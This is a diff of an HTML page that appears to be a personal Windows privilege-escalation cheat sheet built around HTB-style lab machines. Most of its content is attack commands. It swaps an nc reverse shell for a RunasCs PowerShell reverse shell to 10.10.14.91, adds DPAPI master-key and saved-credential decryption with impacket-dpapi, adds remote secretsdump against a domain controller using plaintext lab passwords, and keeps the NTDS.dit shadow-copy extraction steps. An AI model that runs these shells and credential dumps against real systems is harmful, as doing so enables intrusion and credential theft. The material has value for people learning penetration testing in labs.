@@ -304,8 +304,6 @@ PS C:\htb> dir E:
                                     <pre><code class="language-powershell">Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></pre>
                                     <p>That way you can simply perform the copy</p>
                                     <pre><code class="language-powershell">Copy-FileSeBackupPrivilege '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit' 'C:\Tools\ntds.dit'</code></pre>
-                                    
-                                     
                                  </ul>  
 
                                  <p>Then simply go the the path where ntds.dit resides and copy the file using the <b>Copy-FileSeBackupPrivilege already imported</b></p>
@@ -787,7 +785,7 @@ Security settings
                         <h3>Great option</h3>
                         <ul>
                             <p>Using RunasCs.exe it's a good option but we should use nc to stablish a proper shell</p>
-                            <pre><code class="language-powershell">.\RunasCs.exe USER PASSWORD "C:\users\public\documents\nc.exe 10.10.14.91 5555 -e cmd.exe" -t 0</code></pre>
+                            <pre><code class="language-powershell">.\RunasCs.exe USER PASS powershell.exe -r 10.10.14.91:8000</code></pre>
                         </ul>
                     </ul>
 
@@ -817,6 +815,19 @@ mimikatz # sekurlsa::credman  </code></pre>
                         <ul>
                             <p>We could even execute commands as another user</p>
                             <pre><code class="language-powershell">runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
+                            
+                        </ul>
+
+                        <h3>Extracting credentials without an interactive shell</h3>
+                        <ul>
+                            <p>It may be possible that you do not have access to an interactive shell and you are not able to use cmdkey to list and decode credentials. Here we will list how to find where those credentials are stored and decryt them</p>
+                            <p>Inside the following path can find the master key (DPAPI) which first needs to be decrypted</p>
+                            <pre><code class="language-powershell">C:/users/USER/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/"</code></pre>
+                            <p>Download the file and use impacket dpapi tool combined with the user's password and the sid of the same user</p>
+                            <pre><code class="language-powershell">impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14</code></pre>
+                            <p>This will give us the unencrypted key which can be used to show passwords. This passwords are stored in the following path <b>C:/users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3</b></p>
+                            <pre><code class="language-powershell">impacket-dpapi credential -file "todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3" -key 0xd2832547d1d5e0a01ef27ede2d299248d1cb0320061fd5355fea...</code></pre>
+                              
                             
                         </ul>
                     </ul>
@@ -903,11 +914,21 @@ sekurlsa::logonpasswords</code></pre>
                         <p>Adapt the path... and Then copy the file</p>
                         <pre><code class="language-powershell">cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\</code></pre>
                         <p>Transfer the file and crackit using </p>
-                        <pre><code class="language-powershell">secretsdump.py -ntds ntds.dit -system system.save LOCAL</code></pre>
+                        <pre><code class="language-powershell">secretsdump.py -ntds ntds.dit -system system.save LOCAL   #Local processing
+impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'dc.administrator.htb'                                     #Remote dumping</code></pre>
+                        <p>
                         <p>Crack the hash by using <b>-m 1000</b> in hashcat (NTLM)</p>
                         <b>Other easier methods</b>
                         <pre><code class="language-powershell">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</code></pre>
                     
+                    </ul>
+
+                    <h2 id="WSL">WSL</h2>
+                    <ul>
+                        <p>WSL means Windows Subsystem for Linux which is a Windows feature allowing users to run a Linux environment (like Ubuntu) directly on Windows 10/11 without a traditional virtual machine</p>
+                        <p>In case we land getting a shell inside the WSL we must know that the disk of the host machine will be mounted in the following path</p>
+                        <pre><code class="language-powershell">/mnt/c/</code></pre>    
+                        <p>In case we have access to that path we could have access to files in the host machine</p>
                     </ul>
 
                     <h2 id="MS09-012">MS09-012</h2>
